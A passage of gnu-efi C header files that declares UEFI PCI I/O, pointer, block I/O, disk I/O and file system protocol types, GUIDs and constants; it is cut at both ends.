  IN EFI_PCI_IO_PROTOCOL_OPERATION Operation,
  IN VOID                          *HostAddress,
  IN OUT UINTN                     *NumberOfBytes,
  OUT EFI_PHYSICAL_ADDRESS         *DeviceAddress,
  OUT VOID                         **Mapping
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_MAP) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL    *This,
  IN EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_OPERATION  Operation,
  IN VOID                                       *HostAddress,
  IN OUT UINTN                                  *NumberOfBytes,
  OUT EFI_PHYSICAL_ADDRESS                      *DeviceAddress,
  OUT VOID                                      **Mapping
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_UNMAP) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN VOID                         *Mapping
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_UNMAP) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL    *This,
  IN VOID                                       *Mapping
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_ALLOCATE_BUFFER) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN EFI_ALLOCATE_TYPE            Type,
  IN EFI_MEMORY_TYPE              MemoryType,
  IN UINTN                        Pages,
  OUT VOID                        **HostAddress,
  IN UINT64                       Attributes
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_ALLOCATE_BUFFER) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL    *This,
  IN EFI_ALLOCATE_TYPE                          Type,
  IN EFI_MEMORY_TYPE                            MemoryType,
  IN UINTN                                      Pages,
  IN OUT VOID                                   **HostAddress,
  IN UINT64                                     Attributes
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_FREE_BUFFER) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN UINTN                        Pages,
  IN VOID                         *HostAddress
  );

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_FREE_BUFFER) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL    *This,
  IN UINTN                                      Pages,
  IN VOID                                       *HostAddress
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_FLUSH) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_FLUSH) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL    *This
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_GET_LOCATION) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  OUT UINTN                       *SegmentNumber,
  OUT UINTN                       *BusNumber,
  OUT UINTN                       *DeviceNumber,
  OUT UINTN                       *FunctionNumber
);

#define EFI_PCI_ATTRIBUTE_ISA_MOTHERBOARD_IO      0x0001
#define EFI_PCI_ATTRIBUTE_ISA_IO                  0x0002
#define EFI_PCI_ATTRIBUTE_VGA_PALETTE_IO          0x0004
#define EFI_PCI_ATTRIBUTE_VGA_MEMORY              0x0008
#define EFI_PCI_ATTRIBUTE_VGA_IO                  0x0010
#define EFI_PCI_ATTRIBUTE_IDE_PRIMARY_IO          0x0020
#define EFI_PCI_ATTRIBUTE_IDE_SECONDARY_IO        0x0040
#define EFI_PCI_ATTRIBUTE_MEMORY_WRITE_COMBINE    0x0080
#define EFI_PCI_ATTRIBUTE_IO                      0x0100
#define EFI_PCI_ATTRIBUTE_MEMORY                  0x0200
#define EFI_PCI_ATTRIBUTE_BUS_MASTER              0x0400
#define EFI_PCI_ATTRIBUTE_MEMORY_CACHED           0x0800
#define EFI_PCI_ATTRIBUTE_MEMORY_DISABLE          0x1000
#define EFI_PCI_ATTRIBUTE_EMBEDDED_DEVICE         0x2000
#define EFI_PCI_ATTRIBUTE_EMBEDDED_ROM            0x4000
#define EFI_PCI_ATTRIBUTE_DUAL_ADDRESS_CYCLE      0x8000
#define EFI_PCI_ATTRIBUTE_ISA_IO_16               0x10000
#define EFI_PCI_ATTRIBUTE_VGA_PALETTE_IO_16       0x20000
#define EFI_PCI_ATTRIBUTE_VGA_IO_16               0x40000

#define EFI_PCI_IO_ATTRIBUTE_ISA_MOTHERBOARD_IO   EFI_PCI_ATTRIBUTE_ISA_MOTHERBOARD_IO
#define EFI_PCI_IO_ATTRIBUTE_ISA_IO               EFI_PCI_ATTRIBUTE_ISA_IO
#define EFI_PCI_IO_ATTRIBUTE_VGA_PALETTE_IO       EFI_PCI_ATTRIBUTE_VGA_PALETTE_IO
#define EFI_PCI_IO_ATTRIBUTE_VGA_MEMORY           EFI_PCI_ATTRIBUTE_VGA_MEMORY
#define EFI_PCI_IO_ATTRIBUTE_VGA_IO               EFI_PCI_ATTRIBUTE_VGA_IO
#define EFI_PCI_IO_ATTRIBUTE_IDE_PRIMARY_IO       EFI_PCI_ATTRIBUTE_IDE_PRIMARY_IO
#define EFI_PCI_IO_ATTRIBUTE_IDE_SECONDARY_IO     EFI_PCI_ATTRIBUTE_IDE_SECONDARY_IO
#define EFI_PCI_IO_ATTRIBUTE_MEMORY_WRITE_COMBINE EFI_PCI_ATTRIBUTE_MEMORY_WRITE_COMBINE
#define EFI_PCI_IO_ATTRIBUTE_IO                   EFI_PCI_ATTRIBUTE_IO
#define EFI_PCI_IO_ATTRIBUTE_MEMORY               EFI_PCI_ATTRIBUTE_MEMORY
#define EFI_PCI_IO_ATTRIBUTE_BUS_MASTER           EFI_PCI_ATTRIBUTE_BUS_MASTER
#define EFI_PCI_IO_ATTRIBUTE_MEMORY_CACHED        EFI_PCI_ATTRIBUTE_MEMORY_CACHED
#define EFI_PCI_IO_ATTRIBUTE_MEMORY_DISABLE       EFI_PCI_ATTRIBUTE_MEMORY_DISABLE
#define EFI_PCI_IO_ATTRIBUTE_EMBEDDED_DEVICE      EFI_PCI_ATTRIBUTE_EMBEDDED_DEVICE
#define EFI_PCI_IO_ATTRIBUTE_EMBEDDED_ROM         EFI_PCI_ATTRIBUTE_EMBEDDED_ROM
#define EFI_PCI_IO_ATTRIBUTE_DUAL_ADDRESS_CYCLE   EFI_PCI_ATTRIBUTE_DUAL_ADDRESS_CYCLE
#define EFI_PCI_IO_ATTRIBUTE_ISA_IO_16            EFI_PCI_ATTRIBUTE_ISA_IO_16
#define EFI_PCI_IO_ATTRIBUTE_VGA_PALETTE_IO_16    EFI_PCI_ATTRIBUTE_VGA_PALETTE_IO_16
#define EFI_PCI_IO_ATTRIBUTE_VGA_IO_16            EFI_PCI_ATTRIBUTE_VGA_IO_16

#define EFI_PCI_ATTRIBUTE_VALID_FOR_ALLOCATE_BUFFER \
    (EFI_PCI_ATTRIBUTE_MEMORY_WRITE_COMBINE | EFI_PCI_ATTRIBUTE_MEMORY_CACHED | EFI_PCI_ATTRIBUTE_DUAL_ADDRESS_CYCLE)

#define EFI_PCI_ATTRIBUTE_INVALID_FOR_ALLOCATE_BUFFER \
    (~EFI_PCI_ATTRIBUTE_VALID_FOR_ALLOCATE_BUFFER)

typedef struct {
    UINT8 Register;
    UINT8 Function;
    UINT8 Device;
    UINT8 Bus;
    UINT32 ExtendedRegister;
} EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_PCI_ADDRESS;

typedef enum {
    EfiPciIoAttributeOperationGet,
    EfiPciIoAttributeOperationSet,
    EfiPciIoAttributeOperationEnable,
    EfiPciIoAttributeOperationDisable,
    EfiPciIoAttributeOperationSupported,
    EfiPciIoAttributeOperationMaximum
} EFI_PCI_IO_PROTOCOL_ATTRIBUTE_OPERATION;

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_ATTRIBUTES) (
  IN struct _EFI_PCI_IO_PROTOCOL             *This,
  IN EFI_PCI_IO_PROTOCOL_ATTRIBUTE_OPERATION Operation,
  IN UINT64                                  Attributes,
  OUT UINT64                                 *Result OPTIONAL
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_GET_BAR_ATTRIBUTES) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN UINT8                        BarIndex,
  OUT UINT64                      *Supports   OPTIONAL,
  OUT VOID                        **Resources OPTIONAL
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_GET_ATTRIBUTES) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL    *This,
  OUT UINT64                                    *Supports,
  OUT UINT64                                    *Attributes
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_IO_PROTOCOL_SET_BAR_ATTRIBUTES) (
  IN struct _EFI_PCI_IO_PROTOCOL  *This,
  IN UINT64                       Attributes,
  IN UINT8                        BarIndex,
  IN OUT UINT64                   *Offset,
  IN OUT UINT64                   *Length
);

typedef
EFI_STATUS
(EFIAPI *EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_SET_ATTRIBUTES) (
  IN struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL    *This,
  IN UINT64                                     Attributes,
  IN OUT UINT64                                 *ResourceBase,
  IN OUT UINT64                                 *ResourceLength
);

typedef struct _EFI_PCI_IO_PROTOCOL {
  EFI_PCI_IO_PROTOCOL_POLL_IO_MEM        PollMem;
  EFI_PCI_IO_PROTOCOL_POLL_IO_MEM        PollIo;
  EFI_PCI_IO_PROTOCOL_ACCESS             Mem;
  EFI_PCI_IO_PROTOCOL_ACCESS             Io;
  EFI_PCI_IO_PROTOCOL_CONFIG_ACCESS      Pci;
  EFI_PCI_IO_PROTOCOL_COPY_MEM           CopyMem;
  EFI_PCI_IO_PROTOCOL_MAP                Map;
  EFI_PCI_IO_PROTOCOL_UNMAP              Unmap;
  EFI_PCI_IO_PROTOCOL_ALLOCATE_BUFFER    AllocateBuffer;
  EFI_PCI_IO_PROTOCOL_FREE_BUFFER        FreeBuffer;
  EFI_PCI_IO_PROTOCOL_FLUSH              Flush;
  EFI_PCI_IO_PROTOCOL_GET_LOCATION       GetLocation;
  EFI_PCI_IO_PROTOCOL_ATTRIBUTES         Attributes;
  EFI_PCI_IO_PROTOCOL_GET_BAR_ATTRIBUTES GetBarAttributes;
  EFI_PCI_IO_PROTOCOL_SET_BAR_ATTRIBUTES SetBarAttributes;
  UINT64                                 RomSize;
  VOID                                   *RomImage;
} EFI_PCI_IO_PROTOCOL;

// Note: Because it conflicted with the EDK2 struct name, the
// 'EFI_PCI_IO_PROTOCOL' GUID definition, from older versions
// of gnu-efi, is now obsoleted.
// Use 'EFI_PCI_IO_PROTOCOL_GUID' instead.

typedef struct _EFI_PCI_IO_PROTOCOL _EFI_PCI_IO;
typedef EFI_PCI_IO_PROTOCOL EFI_PCI_IO;

typedef struct _EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL {
  EFI_HANDLE                                      ParentHandle;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_POLL_IO_MEM     PollMem;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_POLL_IO_MEM     PollIo;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_ACCESS          Mem;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_ACCESS          Io;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_ACCESS          Pci;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_COPY_MEM        CopyMem;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_MAP             Map;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_UNMAP           Unmap;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_ALLOCATE_BUFFER AllocateBuffer;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_FREE_BUFFER     FreeBuffer;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_FLUSH           Flush;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_GET_ATTRIBUTES  GetAttributes;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_SET_ATTRIBUTES  SetAttributes;
  EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL_CONFIGURATION   Configuration;
  UINT32                                          SegmentNumber;
} EFI_PCI_ROOT_BRIDGE_IO_PROTOCOL;

#endif /* _EFI_PCI_IO_H */

```

`include/gnu-efi/efipoint.h`:

```h
/* Copyright (C) 2014 by John Cronin
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:

 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.

 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#ifndef _EFI_POINT_H
#define _EFI_POINT_H

#define EFI_SIMPLE_POINTER_PROTOCOL_GUID \
	{ 0x31878c87, 0xb75, 0x11d5, { 0x9a, 0x4f, 0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d } }

INTERFACE_DECL(_EFI_SIMPLE_POINTER);

typedef struct {
	INT32 RelativeMovementX;
	INT32 RelativeMovementY;
	INT32 RelativeMovementZ;
	BOOLEAN LeftButton;
	BOOLEAN RightButton;
} EFI_SIMPLE_POINTER_STATE;

typedef struct {
	UINT64 ResolutionX;
	UINT64 ResolutionY;
	UINT64 ResolutionZ;
	BOOLEAN LeftButton;
	BOOLEAN RightButton;
} EFI_SIMPLE_POINTER_MODE;

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_POINTER_RESET) (
	IN struct _EFI_SIMPLE_POINTER *This,
	IN BOOLEAN ExtendedVerification
);

typedef
EFI_STATUS
(EFIAPI *EFI_SIMPLE_POINTER_GET_STATE) (
	IN struct _EFI_SIMPLE_POINTER *This,
	IN OUT EFI_SIMPLE_POINTER_STATE *State
);

typedef struct _EFI_SIMPLE_POINTER {
	EFI_SIMPLE_POINTER_RESET Reset;
	EFI_SIMPLE_POINTER_GET_STATE GetState;
	EFI_EVENT WaitForInput;
	EFI_SIMPLE_POINTER_MODE *Mode;
} EFI_SIMPLE_POINTER_PROTOCOL;

#define EFI_ABSOLUTE_POINTER_PROTOCOL_GUID \
	{ 0x8D59D32B, 0xC655, 0x4AE9, { 0x9B, 0x15, 0xF2, 0x59, 0x04, 0x99, 0x2A, 0x43 } }

INTERFACE_DECL(_EFI_ABSOLUTE_POINTER_PROTOCOL);

typedef struct {
	UINT64 AbsoluteMinX;
	UINT64 AbsoluteMinY;
	UINT64 AbsoluteMinZ;
	UINT64 AbsoluteMaxX;
	UINT64 AbsoluteMaxY;
	UINT64 AbsoluteMaxZ;
	UINT32 Attributes;
} EFI_ABSOLUTE_POINTER_MODE;

typedef struct {
	UINT64 CurrentX;
	UINT64 CurrentY;
	UINT64 CurrentZ;
	UINT32 ActiveButtons;
} EFI_ABSOLUTE_POINTER_STATE;

#define EFI_ABSP_SupportsAltActive 0x00000001
#define EFI_ABSP_SupportsPressureAsZ 0x00000002
#define EFI_ABSP_TouchActive 0x00000001
#define EFI_ABS_AltActive 0x00000002

typedef
EFI_STATUS
(EFIAPI *EFI_ABSOLUTE_POINTER_RESET) (
	IN struct _EFI_ABSOLUTE_POINTER_PROTOCOL *This,
	IN BOOLEAN ExtendedVerification
);

typedef
EFI_STATUS
(EFIAPI *EFI_ABSOLUTE_POINTER_GET_STATE) (
	IN struct _EFI_ABSOLUTE_POINTER_PROTOCOL *This,
	IN OUT EFI_ABSOLUTE_POINTER_STATE *State
);

typedef struct _EFI_ABSOLUTE_POINTER_PROTOCOL {
	EFI_ABSOLUTE_POINTER_RESET Reset;
	EFI_ABSOLUTE_POINTER_GET_STATE GetState;
	EFI_EVENT WaitForInput;
	EFI_ABSOLUTE_POINTER_MODE *Mode;
} EFI_ABSOLUTE_POINTER_PROTOCOL;

#endif

```

`include/gnu-efi/efiprot.h`:

```h
#ifndef _EFI_PROT_H
#define _EFI_PROT_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efiprot.h

Abstract:

    EFI Protocols



Revision History

--*/

//
//  FPSWA library protocol
//
#define EFI_FPSWA_PROTOCOL_GUID \
    { 0xc41b6531, 0x97b9, 0x11d3, {0x9a, 0x29, 0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }
#define FPSWA_PROTOCOL EFI_FPSWA_PROTOCOL_GUID

//
// Device Path protocol
//

#define EFI_DEVICE_PATH_PROTOCOL_GUID \
    { 0x9576e91, 0x6d3f, 0x11d2, {0x8e, 0x39, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }
#define DEVICE_PATH_PROTOCOL EFI_DEVICE_PATH_PROTOCOL_GUID


//
// Block IO protocol
//

#define EFI_BLOCK_IO_PROTOCOL_GUID \
    { 0x964e5b21, 0x6459, 0x11d2, {0x8e, 0x39, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }
#define BLOCK_IO_PROTOCOL EFI_BLOCK_IO_PROTOCOL_GUID

#define EFI_BLOCK_IO_PROTOCOL_REVISION    0x00010000
#define EFI_BLOCK_IO_PROTOCOL_REVISION2   0x00020001
#define EFI_BLOCK_IO_PROTOCOL_REVISION3   ((2<<16) | 31)
#define EFI_BLOCK_IO_INTERFACE_REVISION   EFI_BLOCK_IO_PROTOCOL_REVISION
#define EFI_BLOCK_IO_INTERFACE_REVISION2  EFI_BLOCK_IO_PROTOCOL_REVISION2
#define EFI_BLOCK_IO_INTERFACE_REVISION3  EFI_BLOCK_IO_PROTOCOL_REVISION3

INTERFACE_DECL(_EFI_BLOCK_IO_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_BLOCK_RESET) (
    IN struct _EFI_BLOCK_IO_PROTOCOL  *This,
    IN BOOLEAN                        ExtendedVerification
    );

typedef
EFI_STATUS
(EFIAPI *EFI_BLOCK_READ) (
    IN struct _EFI_BLOCK_IO_PROTOCOL  *This,
    IN UINT32                         MediaId,
    IN EFI_LBA                        LBA,
    IN UINTN                          BufferSize,
    OUT VOID                          *Buffer
    );


typedef
EFI_STATUS
(EFIAPI *EFI_BLOCK_WRITE) (
    IN struct _EFI_BLOCK_IO_PROTOCOL  *This,
    IN UINT32                         MediaId,
    IN EFI_LBA                        LBA,
    IN UINTN                          BufferSize,
    IN VOID                           *Buffer
    );


typedef
EFI_STATUS
(EFIAPI *EFI_BLOCK_FLUSH) (
    IN struct _EFI_BLOCK_IO_PROTOCOL  *This
    );



typedef struct {
    UINT32              MediaId;
    BOOLEAN             RemovableMedia;
    BOOLEAN             MediaPresent;

    BOOLEAN             LogicalPartition;
    BOOLEAN             ReadOnly;
    BOOLEAN             WriteCaching;

    UINT32              BlockSize;
    UINT32              IoAlign;

    EFI_LBA             LastBlock;

    /* revision 2 */
    EFI_LBA             LowestAlignedLba;
    UINT32              LogicalBlocksPerPhysicalBlock;
    /* revision 3 */
    UINT32              OptimalTransferLengthGranularity;
} EFI_BLOCK_IO_MEDIA;

typedef struct _EFI_BLOCK_IO_PROTOCOL {
    UINT64                  Revision;

    EFI_BLOCK_IO_MEDIA      *Media;

    EFI_BLOCK_RESET         Reset;
    EFI_BLOCK_READ          ReadBlocks;
    EFI_BLOCK_WRITE         WriteBlocks;
    EFI_BLOCK_FLUSH         FlushBlocks;

} EFI_BLOCK_IO_PROTOCOL;

typedef struct _EFI_BLOCK_IO_PROTOCOL _EFI_BLOCK_IO;
typedef EFI_BLOCK_IO_PROTOCOL EFI_BLOCK_IO;

#define EFI_BLOCK_IO2_PROTOCOL_GUID \
    { 0xa77b2472, 0xe282, 0x4e9f, {0xa2, 0x45, 0xc2, 0xc0, 0xe2, 0x7b, 0xbc, 0xc1} }

INTERFACE_DECL(_EFI_BLOCK_IO2_PROTOCOL);

typedef struct {
    EFI_EVENT               Event;
    EFI_STATUS              TransactionStatus;
} EFI_BLOCK_IO2_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_BLOCK_RESET_EX) (
    IN struct _EFI_BLOCK_IO2_PROTOCOL  *This,
    IN BOOLEAN                         ExtendedVerification
    );

typedef
EFI_STATUS
(EFIAPI *EFI_BLOCK_READ_EX) (
    IN struct _EFI_BLOCK_IO2_PROTOCOL  *This,
    IN UINT32                          MediaId,
    IN EFI_LBA                         LBA,
    IN OUT EFI_BLOCK_IO2_TOKEN         *Token,
    IN UINTN                           BufferSize,
    OUT VOID                           *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_BLOCK_WRITE_EX) (
    IN struct _EFI_BLOCK_IO2_PROTOCOL  *This,
    IN UINT32                          MediaId,
    IN EFI_LBA                         LBA,
    IN OUT EFI_BLOCK_IO2_TOKEN         *Token,
    IN UINTN                           BufferSize,
    IN VOID                            *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_BLOCK_FLUSH_EX) (
    IN struct _EFI_BLOCK_IO2_PROTOCOL  *This,
    IN OUT EFI_BLOCK_IO2_TOKEN         *Token
    );

typedef struct _EFI_BLOCK_IO2_PROTOCOL {
    EFI_BLOCK_IO_MEDIA  *Media;
    EFI_BLOCK_RESET_EX  Reset;
    EFI_BLOCK_READ_EX   ReadBlocksEx;
    EFI_BLOCK_WRITE_EX  WriteBlocksEx;
    EFI_BLOCK_FLUSH_EX  FlushBlocksEx;
} EFI_BLOCK_IO2_PROTOCOL;

//
// Disk Block IO protocol
//

#define EFI_DISK_IO_PROTOCOL_GUID \
    { 0xce345171, 0xba0b, 0x11d2,  {0x8e, 0x4f, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }
#define DISK_IO_PROTOCOL EFI_DISK_IO_PROTOCOL_GUID

#define EFI_DISK_IO_PROTOCOL_REVISION  0x00010000
#define EFI_DISK_IO_INTERFACE_REVISION EFI_DISK_IO_PROTOCOL_REVISION

INTERFACE_DECL(_EFI_DISK_IO_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_DISK_READ) (
    IN struct _EFI_DISK_IO_PROTOCOL  *This,
    IN UINT32                        MediaId,
    IN UINT64                        Offset,
    IN UINTN                         BufferSize,
    OUT VOID                         *Buffer
    );


typedef
EFI_STATUS
(EFIAPI *EFI_DISK_WRITE) (
    IN struct _EFI_DISK_IO_PROTOCOL  *This,
    IN UINT32                        MediaId,
    IN UINT64                        Offset,
    IN UINTN                         BufferSize,
    IN VOID                          *Buffer
    );


typedef struct _EFI_DISK_IO_PROTOCOL {
    UINT64              Revision;
    EFI_DISK_READ       ReadDisk;
    EFI_DISK_WRITE      WriteDisk;
} EFI_DISK_IO_PROTOCOL;

typedef struct _EFI_DISK_IO_PROTOCOL _EFI_DISK_IO;
typedef EFI_DISK_IO_PROTOCOL EFI_DISK_IO;


#define EFI_DISK_IO2_PROTOCOL_GUID \
    { 0x151c8eae, 0x7f2c, 0x472c,  {0x9e, 0x54, 0x98, 0x28, 0x19, 0x4f, 0x6a, 0x88} }

#define EFI_DISK_IO2_PROTOCOL_REVISION  0x00020000

INTERFACE_DECL(_EFI_DISK_IO2_PROTOCOL);

typedef struct {
    EFI_EVENT  Event;
    EFI_STATUS TransactionStatus;
} EFI_DISK_IO2_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_DISK_CANCEL_EX) (
    IN struct _EFI_DISK_IO2_PROTOCOL  *This
    );

typedef
EFI_STATUS
(EFIAPI *EFI_DISK_READ_EX) (
    IN struct _EFI_DISK_IO2_PROTOCOL  *This,
    IN UINT32                         MediaId,
    IN UINT64                         Offset,
    IN OUT EFI_DISK_IO2_TOKEN         *Token,
    IN UINTN                          BufferSize,
    OUT VOID                          *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_DISK_WRITE_EX) (
    IN struct _EFI_DISK_IO2_PROTOCOL  *This,
    IN UINT32                         MediaId,
    IN UINT64                         Offset,
    IN OUT EFI_DISK_IO2_TOKEN         *Token,
    IN UINTN                          BufferSize,
    IN VOID                           *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_DISK_FLUSH_EX) (
    IN struct _EFI_DISK_IO2_PROTOCOL  *This,
    IN OUT EFI_DISK_IO2_TOKEN         *Token
    );

typedef struct _EFI_DISK_IO2_PROTOCOL {
    UINT64                            Revision;
    EFI_DISK_CANCEL_EX                Cancel;
    EFI_DISK_READ_EX                  ReadDiskEx;
    EFI_DISK_WRITE_EX                 WriteDiskEx;
    EFI_DISK_FLUSH_EX                 FlushDiskEx;
} EFI_DISK_IO2_PROTOCOL;

//
// Simple file system protocol
//

#define EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID \
    { 0x964e5b22, 0x6459, 0x11d2, {0x8e, 0x39, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }
#define SIMPLE_FILE_SYSTEM_PROTOCOL EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID

INTERFACE_DECL(_EFI_SIMPLE_FILE_SYSTEM_PROTOCOL);
INTERFACE_DECL(_EFI_FILE_HANDLE);

typedef
EFI_STATUS
(EFIAPI *EFI_VOLUME_OPEN) (
    IN struct _EFI_SIMPLE_FILE_SYSTEM_PROTOCOL    *This,
    OUT struct _EFI_FILE_HANDLE                   **Root
    );

#define EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_REVISION  0x00010000
#define EFI_FILE_IO_INTERFACE_REVISION EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_REVISION

typedef struct _EFI_SIMPLE_FILE_SYSTEM_PROTOCOL {
    UINT64                  Revision;
    EFI_VOLUME_OPEN         OpenVolume;
} EFI_SIMPLE_FILE_SYSTEM_PROTOCOL;

typedef struct _EFI_SIMPLE_FILE_SYSTEM_PROTOCOL _EFI_FILE_IO_INTERFACE;
typedef EFI_SIMPLE_FILE_SYSTEM_PROTOCOL EFI_FILE_IO_INTERFACE;

//
//
//

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_OPEN) (
    IN struct _EFI_FILE_HANDLE  *File,
    OUT struct _EFI_FILE_HANDLE **NewHandle,
    IN CHAR16                   *FileName,
    IN UINT64                   OpenMode,
    IN UINT64                   Attributes
    );

// Open modes
#define EFI_FILE_MODE_READ      0x0000000000000001
#define EFI_FILE_MODE_WRITE     0x0000000000000002
#define EFI_FILE_MODE_CREATE    0x8000000000000000

// File attributes
#define EFI_FILE_READ_ONLY      0x0000000000000001
#define EFI_FILE_HIDDEN         0x0000000000000002
#define EFI_FILE_SYSTEM         0x0000000000000004
#define EFI_FILE_RESERVIED      0x0000000000000008
#define EFI_FILE_DIRECTORY      0x0000000000000010
#define EFI_FILE_ARCHIVE        0x0000000000000020
#define EFI_FILE_VALID_ATTR     0x0000000000000037

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_CLOSE) (
    IN struct _EFI_FILE_HANDLE  *File
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_DELETE) (
    IN struct _EFI_FILE_HANDLE  *File
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_READ) (
    IN struct _EFI_FILE_HANDLE  *File,
    IN OUT UINTN                *BufferSize,
    OUT VOID                    *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_WRITE) (
    IN struct _EFI_FILE_HANDLE  *File,
    IN OUT UINTN                *BufferSize,
    IN VOID                     *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_SET_POSITION) (
    IN struct _EFI_FILE_HANDLE  *File,
    IN UINT64                   Position
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_GET_POSITION) (
    IN struct _EFI_FILE_HANDLE  *File,
    OUT UINT64                  *Position
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_GET_INFO) (
    IN struct _EFI_FILE_HANDLE  *File,
    IN EFI_GUID                 *InformationType,
    IN OUT UINTN                *BufferSize,
    OUT VOID                    *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_SET_INFO) (
    IN struct _EFI_FILE_HANDLE  *File,
    IN EFI_GUID                 *InformationType,
    IN UINTN                    BufferSize,
    IN VOID                     *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_FLUSH) (
    IN struct _EFI_FILE_HANDLE  *File
    );

typedef struct {
    EFI_EVENT       Event;
    EFI_STATUS      Status;
    UINTN           BufferSize;
    VOID            *Buffer;
} EFI_FILE_IO_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_OPEN_EX)(
    IN struct _EFI_FILE_HANDLE  *File,
    OUT struct _EFI_FILE_HANDLE **NewHandle,
    IN CHAR16                   *FileName,
    IN UINT64                   OpenMode,
    IN UINT64                   Attributes,
    IN OUT EFI_FILE_IO_TOKEN    *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FILE_READ_EX) (
    IN struct _EFI_FILE_HANDLE  *File,
    IN OUT EFI_FILE_IO_TOKEN    *Token
    );

typedef
